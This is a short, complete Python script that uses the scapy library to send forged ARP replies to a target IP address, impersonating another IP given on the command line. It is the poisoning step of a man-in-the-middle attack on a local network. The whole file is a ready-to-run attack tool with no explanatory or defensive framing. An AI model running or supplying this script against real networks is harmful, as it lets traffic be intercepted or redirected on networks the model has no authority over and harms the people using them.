# arp_poisoning.py
from scapy.all import ARP, send
import sys

def arp_poison(target_ip, spoof_ip):
    try:
        print(f"[*] Sending ARP poisoning packets to {target_ip}, pretending to be {spoof_ip}")
        arp_response = ARP(pdst=target_ip, psrc=spoof_ip, op="is-at")
        send(arp_response, count=5, verbose=False)
        return f"ARP poisoning packets sent to {target_ip}, spoofing as {spoof_ip}."
    except Exception as e:
        return f"[!] Failed to send ARP packets: {e}"

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python arp_poisoning.py <target_ip> <spoof_ip>")
        sys.exit(1)

    target = sys.argv[1]
    spoof_ip = sys.argv[2]

    result = arp_poison(target, spoof_ip)
    print(result)
